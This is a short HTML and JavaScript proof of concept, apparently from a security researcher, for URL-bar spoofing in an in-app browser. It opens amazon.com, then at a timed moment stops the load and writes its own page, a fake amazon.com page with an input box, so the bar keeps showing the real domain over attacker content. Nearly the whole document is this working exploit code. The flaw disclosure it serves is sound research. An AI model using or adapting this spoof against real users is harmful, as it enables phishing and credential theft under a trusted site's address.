click <a href="https://www.amazon.com/" id="spoof" onclick="return go()">spoof</a>

<script>
var POC = '<!doctype html><html><head><meta charset="utf-8">'
  + '<meta name="viewport" content="width=device-width, initial-scale=1"><title>amazon.com</title></head>'
  + '<body><h1>Ini Bukan Asli</h1>'
  + 'Spoof here <input type="text"> <button onclick="return false">Submit</button>'
  + '</body></html>';

function inject(){
  try { window.stop(); } catch(e){}
  try { document.open(); document.write(POC); document.close(); } catch(e){}
}

function go(){
  // Real amazon.com responds → the IAB flips the bar to amazon.com (~0.5s on your network),
  // then takes ~2s to render its body. We stop()+inject inside that gap so the bar stays
  // amazon.com with our content. 900ms sits in the middle of your observed window.
  setTimeout(inject, 900);
  return true;
}
</script>
